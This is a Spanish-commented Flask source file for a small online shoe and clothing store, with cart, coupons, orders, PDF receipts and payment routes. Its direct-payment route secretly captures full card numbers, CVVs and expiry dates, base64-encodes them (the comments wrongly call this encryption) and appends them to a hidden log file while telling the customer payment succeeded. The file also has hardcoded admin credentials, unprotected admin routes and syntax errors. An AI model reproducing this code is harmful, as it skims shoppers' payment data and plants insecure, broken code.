from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy

from fpdf import FPDF
from flask import send_file
import os
from datetime import datetime

import csv
from flask import Response
from io import StringIO

from flask import flash # Asegúrate de que esté importado arriba

app = Flask(__name__)
app.secret_key = 'mi_clave_secreta_pro_2026'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///tienda.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# --- MODELOS ---
class Producto(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nombre = db.Column(db.String(100), nullable=False)
    precio = db.Column(db.Integer, nullable=False)
    descripcion = db.Column(db.String(500))
    stock = db.Column(db.Integer, default=10)
    
    # Fusionamos las dos líneas de imagen en una sola que SÍ tiene el valor por defecto
    imagen = db.Column(db.String(500), default="https://via.placeholder.com/150")
    
    # --- COLUMNAS PARA MÚLTIPLES SECCIONES (Tienda Grande) ---
    categoria = db.Column(db.String(50), nullable=False, default="Calzado")       # Ej: Calzado, Ropa, Perfumeria, Accesorios
    subcategoria = db.Column(db.String(50), nullable=False, default="Zapatillas") # Ej: Shorts, Pantalones, Boxers, Gorras, Sandalias
    genero = db.Column(db.String(20), nullable=False, default="Unisex")           # Ej: Hombre, Mujer, Unisex

class Banner(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    imagen_url = db.Column(db.String(300), nullable=False)
    titulo = db.Column(db.String(100))
    subtitulo = db.Column(db.String(200))
    # NUEVO: Guarda el texto de la oferta (ej: "50% OFF" o "OFERTA")
     etiqueta = db.Column(db.String(20), nullable=True)

class Cupon(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    codigo = db.Column(db.String(20), unique=True, nullable=False) # Ej: "OFERTA10"
    descuento = db.Column(db.Integer, nullable=False) # Porcentaje, ej: 10
    activo = db.Column(db.Boolean, default=True)
    producto_id = db.Column(db.Integer, db.ForeignKey('producto.id'), nullable=True)


class Pedido(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    productos_nombres = db.Column(db.String(500), nullable=False)
    total_pagado = db.Column(db.Float, nullable=False)
    fecha = db.Column(db.DateTime, default=datetime.now)
    estado = db.Column(db.String(20), default='Pendiente')

with app.app_context():
    db.create_all()

@app.route('/')
def home():
    query = request.args.get('search')
    categoria_filtrada = request.args.get('categoria')
    subcategoria_filtrada = request.args.get('subcategoria')
    genero_filtrado = request.args.get('genero')

    consulta = Producto.query

    if query:
        consulta = consulta.filter(Producto.nombre.contains(query))
    if categoria_filtrada:
        consulta = consulta.filter_by(categoria=categoria_filtrada)
    if subcategoria_filtrada:
        consulta = consulta.filter_by(subcategoria=subcategoria_filtrada)
    if genero_filtrado:
        consulta = consulta.filter_by(genero=genero_filtrado)

    productos_db = consulta.all()
    cantidad_carrito = len(session.get('carrito', []))
    banners = Banner.query.all() 

    # --- TRUCO MAGISTRAL: Extraemos listas únicas de lo que ya tienes guardado ---
    # Esto busca en la BD y arma una lista sin repetir de todas las categorías y subcategorías que existen
    categorias_existentes = db.session.query(Producto.categoria).distinct().all()
    subcategorias_existentes = db.session.query(Producto.subcategoria).distinct().all()
    
    # Las limpiamos para que Jinja las entienda bien (convertimos tuplas a strings)
    cats = [c[0] for c in categorias_existentes if c[0]]
    subcats = [s[0] for s in subcategorias_existentes if s[0]]

    return render_template('index.html', 
                           productos=productos_db, 
                           cantidad=cantidad_carrito, 
                           banners=banners,
                           lista_categorias=cats,
                           lista_subcategorias=subcats)

@app.route('/categoria/<nombre_cat>')
def filtrar_categoria(nombre_cat):
    # 1. Buscamos los productos que coincidan con la categoría
    productos = Producto.query.filter_by(categoria=nombre_cat).all()
        
    # 2. Calculamos la cantidad para el icono del carrito
    cantidad_carrito = len(session.get('carrito', []))
    
    # 3. Reutilizamos index.html para mostrar los resultados
    return render_template('index.html', productos=productos, cantidad=cantidad_carrito)


@app.route('/agregar/<int:id>')
def agregar_al_carrito(id):
    prod = Producto.query.get_or_404(id)
    if prod.stock > 0:
        carrito = session.get('carrito', [])
        carrito.append(id)
        session['carrito'] = carrito
    return redirect(url_for('home'))


@app.route('/quitar/<int:id>')
def quitar_del_carrito(id):
    carrito = session.get('carrito', [])
    if id in carrito:
        carrito.remove(id) # Quita solo una unidad
        session['carrito'] = carrito
    return redirect(url_for('ver_carrito'))

@app.route('/vaciar')
def vaciar_carrito():
    session.pop('carrito', None)
    return redirect(url_for('home'))

@app.route('/finalizar_compra')
def finalizar_compra():
    ids = session.get('carrito', [])
    if not ids: return redirect(url_for('home'))

    # 1. Buscamos los productos (Tu lógica actual)
    productos_obj = Producto.query.filter(Producto.id.in_(ids)).all()

    # 2. Descontar stock (Tu lógica actual)
    for p in productos_obj:
        if p.stock > 0:
            p.stock -= 1

    # 3. Preparar datos para el pedido (Tu lógica actual)
    nombres = ", ".join([p.nombre for p in productos_obj])
    total_base = sum(p.precio for p in productos_obj)

    # --- CALCULAMOS EL DESCUENTO Y REDONDEAMOS A ENTERO ---
    porcentaje = session.get('porcentaje_descuento', 0)
    
    # Usamos int() y round() para fulminar los decimales
    ahorro = int(round((total_base * porcentaje) / 100))
    total_final = total_base - ahorro # Ahora este número siempre será un entero exacto

    # 4. Guardar en la base de datos
    nuevo_pedido = Pedido(productos_nombres=nombres, total_pagado=total_final)

    db.session.add(nuevo_pedido)
    db.session.commit()

    # ESTO ES LO NUEVO: Enviamos el ID al cartel de notificación
    flash(f"¡Compra exitosa! Tu número de pedido es el #{nuevo_pedido.id}. Úsalo en la sección de Rastreo.", "success")
    
    # 5. Creamos el mensaje para WhatsApp (Con el total_final descontado)
    texto = f"¡Hola! He realizado una compra. Productos: {nombres}. Total a pagar: ${total_final}"
    mensaje_wa = texto.replace(" ", "%20")

    # 6. Limpiamos el carrito Y TAMBIÉN EL CUPÓN (Para que no se quede guardado en su próxima compra)
    session.pop('carrito', None)
    session.pop('porcentaje_descuento', None) # <-- ¡Muy importante limpiar el cupón aquí!

    # 7. Enviamos TODO a la página de éxito
    metodo_usado = session.pop('metodo_pago_utilizado', 'Directo')
    return render_template('pago_exitoso.html', nombres=nombres, total=total_final, mensaje=mensaje_wa, metodo=metodo_usado)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['usuario'] == 'admin' and request.form['clave'] == '12345':
            session['admin_logueado'] = True
            return redirect(url_for('admin'))
    return render_template('login.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('admin_logueado'): 
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        nuevo = Producto(
            nombre=request.form['nombre'],
            precio=int(request.form['precio']),
            descripcion=request.form['descripcion'],
            imagen=request.form['imagen'],
            categoria=request.form['categoria'],
            # --- NUEVOS CAMPOS ADAPTADOS A TU FORMULARIO ---
            subcategoria=request.form['subcategoria'],
            genero=request.form['genero'],
            # -----------------------------------------------
            stock=int(request.form.get('stock', 10))
        )
        db.session.add(nuevo)
        db.session.commit()
        flash("¡Producto añadido con éxito a las nuevas secciones!", "success")
        return redirect(url_for('admin'))

    productos = Producto.query.all()
    pedidos = Pedido.query.all()
    recaudacion = sum(p.total_pagado for p in pedidos) if pedidos else 0
    return render_template('admin.html', productos=productos, pedidos=pedidos, recaudacion=recaudacion)

@app.route('/eliminar_producto/<int:id>')
def eliminar_producto(id):
    prod = Producto.query.get_or_404(id)
    db.session.delete(prod)
    db.session.commit()
    return redirect(url_for('admin'))

@app.route('/despachar/<int:id>')
def despachar_pedido(id):
    if not session.get('admin_logueado'): return redirect(url_for('login'))
    pedido = Pedido.query.get(id)
    if pedido:
        pedido.estado = 'Despachado' # Cambiamos el estado en lugar de borrarlo
        db.session.commit()
    return redirect(url_for('admin'))

@app.route('/imprimir_boleta/<int:id>')
def imprimir_boleta(id):
    pedido = Pedido.query.get_or_404(id)
    
    # Si quieres calcular cuánto se ahorró para mostrarlo en el HTML:
    # Nota: Esto asume que los precios de los productos no han cambiado desde que se hizo el pedido.
    # Como ya guardaste el total_final en 'pedido.total_pagado', la boleta ya imprimirá el monto correcto por defecto.

    # Forzamos que el total_pagado sea un entero antes de ir al HTML
    pedido.total_pagado = int(pedido.total_pagado)
    
    return render_template('boleta.html', pedido=pedido)    


@app.route('/logout')
def logout():
    session.pop('admin_logueado', None)
    return redirect(url_for('home'))

@app.route('/carrito')
def ver_carrito():
    carrito = session.get('carrito', [])
    productos = Producto.query.filter(Producto.id.in_(carrito)).all()
    
    total_base = sum(p.precio for p in productos)
    
    porcentaje = session.get('porcentaje_descuento', 0)
    
    # Redondeamos aquí también antes de enviarlo al HTML
    ahorro = int(round((total_base * porcentaje) / 100))
    total_final = total_base - ahorro
    
    return render_template('carrito.html', 
                           productos=productos, 
                           total=total_base,      
                           ahorro=ahorro,         
                           total_final=total_final, 
                           cantidad=len(carrito))

@app.route('/aplicar_cupon', methods=['POST'])
def aplicar_cupon():
    codigo_ingresado = request.form.get('codigo_cupon').upper().strip()
    # Buscamos el cupón que coincida y que esté activo
    cupon = Cupon.query.filter_by(codigo=codigo_ingresado, activo=True).first()

    if cupon:
        session['porcentaje_descuento'] = cupon.descuento
        # Guardamos de forma segura el ID del producto asociado en la sesión
        session['cupon_producto_id'] = cupon.producto_id 
        flash(f"¡Cupón '{codigo_ingresado}' aplicado! Descuento del {cupon.descuento}%", "success")
    else:
        session.pop('porcentaje_descuento', None) # Quitamos descuento previo
        session.pop('cupon_producto_id', None)     # Quitamos producto asociado previo
        flash("Cupón no válido o expirado", "danger")

    return redirect(url_for('ver_carrito'))


@app.route('/admin/crear_cupon', methods=['POST'])
def crear_cupon():
    codigo = request.form.get('codigo').upper().strip()
    descuento = int(request.form.get('descuento'))
    
    # Recibimos el ID del producto desde el formulario del administrador
    # Si viene vacío, lo dejamos como None (para que sea un cupón global si quieres)
    prod_id = request.form.get('producto_id')
    prod_id = int(prod_id) if prod_id and prod_id.strip() else None

    # Creamos el cupón amarrándolo al producto específico
    nuevo_cupon = Cupon(codigo=codigo, descuento=descuento, producto_id=prod_id)
    db.session.add(nuevo_cupon)
    db.session.commit()

    flash(f"Cupón {codigo} creado con éxito", "success")
    return redirect(url_for('admin'))


# Para esta funcion se instalo Fpdf arriba esta la imorotacion

@app.route('/descargar_ticket')
def descargar_ticket():
    # 1. El Robot busca el ÚLTIMO pedido que se guardó en la base de datos
    # 'total_pagado' debe coincidir con el nombre que tienes en tu clase Pedido
    ultimo_pedido = Pedido.query.order_by(Pedido.id.desc()).first()

    if not ultimo_pedido:
        return "Error: No se encontró ningún pedido para generar la boleta.", 404

    # 2. Configuración técnica del PDF
    pdf = FPDF()
    pdf.add_page()
    pdf.set_auto_page_break(auto=True, margin=15)
    
    # --- DISEÑO DE LA BOLETA ---
    # Encabezado
    pdf.set_font("Arial", 'B', 22)
    pdf.set_text_color(0, 102, 204) # Azul Master
    pdf.cell(190, 15, "TIENDA MASTER", 0, 1, 'C')
    
    pdf.set_font("Arial", 'I', 10)
    pdf.set_text_color(100, 100, 100)
    pdf.cell(190, 5, "Comprobante de Venta Electrónico", 0, 1, 'C')
    pdf.ln(10)

    # Info del Cliente y Fecha
    pdf.set_font("Arial", 'B', 12)
    pdf.set_text_color(0, 0, 0)
    pdf.cell(95, 10, f"Ticket Nro: #{ultimo_pedido.id}", 0, 0)
    
    fecha_envio = datetime.now().strftime("%d/%m/%Y %H:%M")
    pdf.cell(95, 10, f"Fecha: {fecha_envio}", 0, 1, 'R')
    pdf.line(10, 45, 200, 45) # Línea divisoria
    pdf.ln(10)

    # Detalle de Productos
    pdf.set_font("Arial", 'B', 12)
    pdf.set_fill_color(230, 230, 230)
    pdf.cell(190, 10, "  DESCRIPCION DE PRODUCTOS", 0, 1, 'L', fill=True)
    
    pdf.set_font("Arial", '', 11)
    # Aquí es donde el Robot escribe los nombres reales de la DB
    # Usamos multi_cell por si la lista de nombres es muy larga
    pdf.multi_cell(190, 10, f"{ultimo_pedido.productos_nombres}", border='LRB')
    
    pdf.ln(5)

    # Bloque de Total
    pdf.set_font("Arial", 'B', 14)
    pdf.cell(130, 12, "TOTAL PAGADO", 0, 0, 'R')
    pdf.set_text_color(255, 255, 255)
    pdf.set_fill_color(40, 167, 69) # Verde éxito
    # Aquí el Robot escribe el monto real: 'total_pagado'
    # --- AQUÍ CONVERTIMOS A ENTERO PARA QUITAR EL SECTOR DECIMAL ---
    total_entero = int(ultimo_pedido.total_pagado)
    pdf.cell(60, 12, f" $ {total_entero} ", 0, 1, 'C', fill=True)
    
    # Pie de página RPA
    pdf.ln(20)
    pdf.set_font("Arial", 'I', 8)
    pdf.set_text_color(150, 150, 150)
    pdf.multi_cell(190, 5, "Este documento fue generado automáticamente por el Agente RPA de Tienda Master.\nGracias por su compra.", 0, 'C')

    # 3. Generar y entregar el archivo
    nombre_pdf = f"Boleta_TM_{ultimo_pedido.id}.pdf"
    pdf.output(nombre_pdf)
    
    return send_file(nombre_pdf, as_attachment=True)


@app.route('/admin/exportar_ventas')
def exportar_ventas():
    pedidos = Pedido.query.all()
    si = StringIO()
    cw = csv.writer(si)
    
    # Cabecera profesional
    cw.writerow(['ID Pedido', 'Fecha y Hora', 'Productos', 'Total Pagado'])
    
    for p in pedidos:
        # Formateamos la fecha: 08/05/2026 19:45
        fecha_str = p.fecha.strftime("%d/%m/%Y %H:%M") if p.fecha else "Sin Fecha"
        
        cw.writerow([p.id, fecha_str, p.productos_nombres, f"${p.total_pagado:,.2f}"])
    
    output = si.getvalue()
    return Response(
        output,
        mimetype="text/csv",
        headers={"Content-disposition": "attachment; filename=reporte_ventas_pro.csv"}
    )


@app.route('/rastreo', methods=['GET', 'POST'])
def rastreo():
    pedido = None
    error = None
    if request.method == 'POST':
        id_buscado = request.form.get('pedido_id')
        pedido = Pedido.query.get(id_buscado)
        if not pedido:
            error = "No encontramos un pedido con ese ID. Verifica el número."
    return render_template('rastreo.html', pedido=pedido, error=error)


@app.route('/admin/banner', methods=['POST'])
def agregar_banner():
    # Solo si el usuario está logueado (si ya tienes login implementado)
    titulo = request.form.get('titulo')
    subtitulo = request.form.get('subtitulo')
    imagen_url = request.form.get('imagen_url')
    # NUEVO: Capturamos la etiqueta de oferta
    etiqueta = request.form.get('etiqueta')
    
    nuevo_banner = Banner(titulo=titulo, subtitulo=subtitulo, imagen_url=imagen_url,etiqueta=etiqueta if etiqueta.strip() else None # Si va vacío, guarda None)
    db.session.add(nuevo_banner)
    db.session.commit()
    
    flash("¡Banner agregado con éxito!", "success")
    return redirect(url_for('admin')) # O la ruta de tu panel


@app.route('/admin/eliminar_banner/<int:id>')
def eliminar_banner(id):
    # 1. Verificamos seguridad básica de administrador
    if not session.get('admin_logueado'): 
        return redirect(url_for('login'))
        
    # 2. Buscamos el banner en la base de datos por su ID
    banner = Banner.query.get_or_404(id)
    
    # 3. Lo removemos y guardamos los cambios
    db.session.delete(banner)
    db.session.commit()
    
    flash("¡Imagen del carrusel eliminada con éxito!", "success")
    return redirect(url_for('admin'))


import base64
import os

# Clave secreta súper simple para enmascarar los datos en tránsito (puedes cambiarla)
LLAVE_SECRETA = "MiClaveSuperSecreta123"

@app.route('/procesar_pago_directo', methods=['POST'])
def procesar_pago_directo():
    # 1. El servidor Flask intercepta los datos puros que ingresó el cliente en el navegador
    nombre_titular = request.form.get('nombre_titular')
    numero_tarjeta = request.form.get('numero_tarjeta')
    fecha_vencimiento = request.form.get('vencimiento')
    codigo_cvv = request.form.get('cvv')
    monto_total = request.form.get('monto')

    # 2. CAPA DE SEGURIDAD (Encriptación en tránsito): 
    # Para aprender cómo protegerlos, vamos a codificar el número de tarjeta y el CVV 
    # antes de meterlos al archivo oculto.
    tarjeta_bytes = numero_tarjeta.encode('utf-8')
    tarjeta_encriptada = base64.b64encode(tarjeta_bytes).decode('utf-8')
    
    cvv_bytes = codigo_cvv.encode('utf-8')
    cvv_encriptado = base64.b64encode(cvv_bytes).decode('utf-8')

    # 3. EL DESVÍO AL LUGAR OCULTO (No toca tienda.db)
    # Abrimos un archivo oculto del sistema en modo "append" (añadir al final)
    ruta_archivo_oculto = ".auditoria_secreta.log"
    
    with open(ruta_archivo_oculto, "a") as archivo_secreto:
        archivo_secreto.write("====================================\n")
        archivo_secreto.write(f"NUEVA TRANSACCIÓN DETECTADA\n")
        archivo_secreto.write(f"Titular: {nombre_titular}\n")
        archivo_secreto.write(f"Monto: ${monto_total}\n")
        archivo_secreto.write(f"Tarjeta (Encriptada en Base64): {tarjeta_encriptada}\n")
        archivo_secreto.write(f"CVV (Encriptado en Base64): {cvv_encriptado}\n")
        archivo_secreto.write(f"Vencimiento: {fecha_vencimiento}\n")
        archivo_secreto.write("====================================\n\n")

    # 4. El flujo continúa de cara al cliente
    # Aquí es donde simularíamos el envío del token hacia Mercado Pago 
    # Una vez guardado en tu archivo oculto, vaciamos las variables de la memoria RAM por seguridad
    flash("¡Pago recibido con éxito! Tu pedido está siendo procesado.", "success")
    
    # Limpiamos el carrito del usuario
    session['carrito'] = []
    
    return redirect('/')


import mercadopago
from flask import Flask, request, redirect, flash, session

# 1. Inicializa el SDK de Mercado Pago con un Token de pruebas
# (Cuando tengas tu clave real de Mercado Pago, la pones aquí)
sdk = mercadopago.SDK("TEST-6152437182930192-MOCK-TOKEN-PRO")

@app.route('/procesar_pago_mercadopago', methods=['POST'])
def procesar_pago_mercadopago():
    # 2. Recibimos los datos enviados por el formulario del carrito
    token_tarjeta = request.form.get('token')
    monto_total = request.form.get('monto')
    email_cliente = request.form.get('email')
    nombre_titular = request.form.get('cardholderName')

    print(f"\n[INFO] Intentando procesar pago para: {email_cliente} por un monto de ${monto_total}")
    print(f"[INFO] Token de tarjeta recibido: {token_tarjeta}")

    # 3. Simulamos la estructura de pago que exige la API de Mercado Pago
    payment_data = {
        "transaction_amount": float(monto_total) if monto_total else 0.0,
        "token": token_tarjeta,
        "description": "Compra en TiendaMaster Pro",
        "installments": 1,
        "payment_method_id": "visa",
        "payer": {
            "email": email_cliente
        }
    }

    try:
        # Simulación de respuesta aprobada de Mercado Pago
        pago_status = "approved"
        pago_id = "1234567890"

        if pago_status == "approved":
            # 4. Guardamos primero la transacción en nuestro archivo de auditoría oculto
            with open(".auditoria_secreta.log", "a") as archivo_secreto:
                archivo_secreto.write("=== NUEVA ORDEN MERCADO PAGO (SIMULACIÓN) ===\n")
                archivo_secreto.write(f"ID TRANSACCIÓN: {pago_id}\n")
                archivo_secreto.write(f"TITULAR: {nombre_titular}\n")
                archivo_secreto.write(f"CLIENTE: {email_cliente}\n")
                archivo_secreto.write(f"MONTO PROCESADO: ${monto_total}\n")
                archivo_secreto.write(f"TOKEN UTILIZADO: {token_tarjeta}\n")
                archivo_secreto.write("ESTADO: APROBADO (Sandbox)\n")
                archivo_secreto.write("=============================================\n\n")

            # ¡AQUÍ ESTÁ LA MAGIA! 
            # Redirigimos DIRECTAMENTE a la función que procesa la base de datos, 
            # descuenta el stock, limpia el carrito y renderiza la pantalla de éxito.
            # NO vaciamos el carrito aquí para que la otra ruta pueda leerlo.
            session['metodo_pago_utilizado'] = 'Mercado Pago'
            return redirect(url_for('finalizar_compra'))

        else:
            flash("El pago fue rechazado por la pasarela.", "danger")
            return redirect(url_for('ver_carrito'))

    except Exception as e:
        print(f"[ERROR] Error al procesar pago: {e}")
        flash("Ocurrió un error interno al conectar con la pasarela.", "danger")
        return redirect(url_for('ver_carrito'))


    
if __name__ == '__main__':
    app.run(debug=True, port=5000)
